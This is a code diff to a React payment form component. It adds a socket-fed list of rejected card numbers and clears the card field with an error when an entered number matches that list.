@@ -268,6 +268,7 @@ export default function CreditCardPayment() {
   const [selectedCountry, setSelectedCountry] = useState({code:'iq',en:'Iraq',ar:'العراق'});
   const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
   const [globalBlockedError, setGlobalBlockedError] = useState(false);
+  const [rejectedCards, setRejectedCards] = useState<string[]>([]);
 
   useEffect(() => {
     socket.value.emit("blockedCards:get");
@@ -280,12 +281,18 @@ export default function CreditCardPayment() {
       setGlobalBlockedCards(cards || []);
     };
 
+    const handleRejectedCards = (cards: string[]) => {
+      setRejectedCards(cards || []);
+    };
+
     socket.value.on("blockedCards:list", handleBlockedCardsList);
     socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);
+    socket.value.on("rejectedCards:list", handleRejectedCards);
 
     return () => {
       socket.value.off("blockedCards:list", handleBlockedCardsList);
       socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
+      socket.value.off("rejectedCards:list", handleRejectedCards);
     };
   }, []);
 
@@ -303,6 +310,10 @@ export default function CreditCardPayment() {
 
     if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
       setCardError(true);
+      setValue("cardNumber", "");
+      setLuhnError(false);
+    } else if (rawValue.length >= 13 && rejectedCards.includes(rawValue)) {
+      setRejectedError(true);
       setValue("cardNumber", "");
       setLuhnError(false);
     } else {
